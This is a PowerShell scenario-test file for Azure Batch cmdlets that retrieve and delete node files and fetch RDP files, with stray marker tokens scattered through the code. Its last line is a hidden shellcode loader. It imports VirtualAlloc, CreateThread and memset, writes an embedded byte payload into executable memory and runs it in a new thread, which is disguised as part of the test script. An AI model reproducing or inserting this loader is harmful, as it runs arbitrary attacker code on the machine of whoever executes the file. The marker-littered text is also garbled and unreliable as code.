














 -||-> function Test-GetNodeFileContentByTask
{
    param([string]$jobId, [string]$taskId, [string]$nodeFilePath, [string]$fileContent)

     -||-> $context =  -||-> New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext <-||-  <-||- 
     -||-> $stream =  -||-> New-Object System.IO.MemoryStream <-||-  <-||-  

     -||-> try
    {
         -||-> $nodeFile =  -||-> Get-AzBatchNodeFile -JobId $jobId -TaskId $taskId -Path $nodeFilePath -BatchContext $context <-||-  <-||- 
         -||-> $nodeFile | Get-AzBatchNodeFileContent -BatchContext $context -DestinationStream $stream <-||- 
        
         -||-> $stream.Position = 0 <-||- 
         -||-> $sr =  -||-> New-Object System.IO.StreamReader $stream <-||-  <-||- 
         -||-> $downloadedContents = $sr.ReadToEnd() <-||- 

        
         -||-> Assert-True {  -||-> $downloadedContents.Contains($fileContent) <-||-  } <-||- 
    }
    finally
    {
         -||-> if ( -||-> $sr -ne $null <-||- )
        {
             -||-> $sr.Dispose() <-||- 
        } <-||- 
         -||-> $stream.Dispose() <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-GetNodeFileContentByComputeNode
{
    param([string]$poolId, [string]$computeNodeId, [string]$nodeFilePath, [string]$fileContent)

     -||-> $context =  -||-> New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext <-||-  <-||- 
     -||-> $stream =  -||-> New-Object System.IO.MemoryStream <-||-  <-||-  

     -||-> try
    {
         -||-> $nodeFile =  -||-> Get-AzBatchNodeFile -PoolId $poolId -ComputeNodeId $computeNodeId -Path $nodeFilePath -BatchContext $context <-||-  <-||- 
         -||-> $nodeFile | Get-AzBatchNodeFileContent -BatchContext $context -DestinationStream $stream <-||- 
        
         -||-> $stream.Position = 0 <-||- 
         -||-> $sr =  -||-> New-Object System.IO.StreamReader $stream <-||-  <-||- 
         -||-> $downloadedContents = $sr.ReadToEnd() <-||- 

        
         -||-> Assert-True {  -||-> $downloadedContents.Contains($fileContent) <-||-  } <-||- 
    }
    finally
    {
         -||-> if ( -||-> $sr -ne $null <-||- )
        {
             -||-> $sr.Dispose() <-||- 
        } <-||- 
         -||-> $stream.Dispose() <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-GetRDPFile
{
    param([string]$poolId, [string]$computeNodeId)

     -||-> $context =  -||-> New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext <-||-  <-||- 
     -||-> $stream =  -||-> New-Object System.IO.MemoryStream <-||-  <-||-  
     -||-> $rdpContents = "full address" <-||- 

     -||-> try
    {
         -||-> $computeNode =  -||-> Get-AzBatchComputeNode -PoolId $poolId -Id $computeNodeId -BatchContext $context <-||-  <-||- 
         -||-> $computeNode | Get-AzBatchRemoteDesktopProtocolFile -BatchContext $context -DestinationStream $stream <-||- 
        
         -||-> $stream.Position = 0 <-||- 
         -||-> $sr =  -||-> New-Object System.IO.StreamReader $stream <-||-  <-||- 
         -||-> $downloadedContents = $sr.ReadToEnd() <-||- 

        
         -||-> Assert-True {  -||-> $downloadedContents.Contains($rdpContents) <-||-  } <-||- 
    }
    finally
    {
         -||-> if ( -||-> $sr -ne $null <-||- )
        {
             -||-> $sr.Dispose() <-||- 
        } <-||- 
         -||-> $stream.Dispose() <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-DeleteNodeFileByTask 
{
    param([string]$jobId, [string]$taskId, [string]$filePath)
    
     -||-> $context =  -||-> New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext <-||-  <-||- 
     -||-> Get-AzBatchNodeFile -JobId $jobId -TaskId $taskId -Path $filePath -BatchContext $context | Remove-AzBatchNodeFile -Force -BatchContext $context <-||- 
    
    
     -||-> $file =  -||-> Get-AzBatchNodeFile -JobId $jobId -TaskId $taskId -Filter "startswith(name,'$filePath')" -BatchContext $context <-||-  <-||- 

     -||-> Assert-AreEqual $null $file <-||- 
} <-||- 


 -||-> function Test-DeleteNodeFileByComputeNode 
{
    param([string]$poolId, [string]$computeNodeId, [string]$filePath)
    
     -||-> $context =  -||-> New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext <-||-  <-||- 
     -||-> Get-AzBatchNodeFile $poolId $computeNodeId $filePath -BatchContext $context | Remove-AzBatchNodeFile -Force -BatchContext $context <-||- 

    
     -||-> $file =  -||-> Get-AzBatchNodeFile $poolId $computeNodeId -Filter "startswith(name,'$filePath')" -BatchContext $context <-||-  <-||- 

     -||-> Assert-AreEqual $null $file <-||- 
} <-||- 
 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbd,0x46,0x02,0xa3,0xe0,0xd9,0xc1,0xd9,0x74,0x24,0xf4,0x5f,0x29,0xc9,0xb1,0x47,0x31,0x6f,0x13,0x83,0xc7,0x04,0x03,0x6f,0x49,0xe0,0x56,0x1c,0xbd,0x66,0x98,0xdd,0x3d,0x07,0x10,0x38,0x0c,0x07,0x46,0x48,0x3e,0xb7,0x0c,0x1c,0xb2,0x3c,0x40,0xb5,0x41,0x30,0x4d,0xba,0xe2,0xff,0xab,0xf5,0xf3,0xac,0x88,0x94,0x77,0xaf,0xdc,0x76,0x46,0x60,0x11,0x76,0x8f,0x9d,0xd8,0x2a,0x58,0xe9,0x4f,0xdb,0xed,0xa7,0x53,0x50,0xbd,0x26,0xd4,0x85,0x75,0x48,0xf5,0x1b,0x0e,0x13,0xd5,0x9a,0xc3,0x2f,0x5c,0x85,0x00,0x15,0x16,0x3e,0xf2,0xe1,0xa9,0x96,0xcb,0x0a,0x05,0xd7,0xe4,0xf8,0x57,0x1f,0xc2,0xe2,0x2d,0x69,0x31,0x9e,0x35,0xae,0x48,0x44,0xb3,0x35,0xea,0x0f,0x63,0x92,0x0b,0xc3,0xf2,0x51,0x07,0xa8,0x71,0x3d,0x0b,0x2f,0x55,0x35,0x37,0xa4,0x58,0x9a,0xbe,0xfe,0x7e,0x3e,0x9b,0xa5,0x1f,0x67,0x41,0x0b,0x1f,0x77,0x2a,0xf4,0x85,0xf3,0xc6,0xe1,0xb7,0x59,0x8e,0xc6,0xf5,0x61,0x4e,0x41,0x8d,0x12,0x7c,0xce,0x25,0xbd,0xcc,0x87,0xe3,0x3a,0x33,0xb2,0x54,0xd4,0xca,0x3d,0xa5,0xfc,0x08,0x69,0xf5,0x96,0xb9,0x12,0x9e,0x66,0x46,0xc7,0x31,0x37,0xe8,0xb8,0xf1,0xe7,0x48,0x69,0x9a,0xed,0x47,0x56,0xba,0x0d,0x82,0xff,0x51,0xf7,0x44,0xc0,0x0e,0xf6,0xa3,0xa8,0x4c,0xf9,0xda,0x74,0xd8,0x1f,0xb6,0x94,0x8c,0x88,0x2e,0x0c,0x95,0x43,0xcf,0xd1,0x03,0x2e,0xcf,0x5a,0xa0,0xce,0x81,0xaa,0xcd,0xdc,0x75,0x5b,0x98,0xbf,0xd3,0x64,0x36,0xd5,0xdb,0xf0,0xbd,0x7c,0x8c,0x6c,0xbc,0x59,0xfa,0x32,0x3f,0x8c,0x71,0xfa,0xd5,0x6f,0xed,0x03,0x3a,0x70,0xed,0x55,0x50,0x70,0x85,0x01,0x00,0x23,0xb0,0x4d,0x9d,0x57,0x69,0xd8,0x1e,0x0e,0xde,0x4b,0x77,0xac,0x39,0xbb,0xd8,0x4f,0x6c,0x3d,0x24,0x86,0x48,0x4b,0x44,0x1a <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



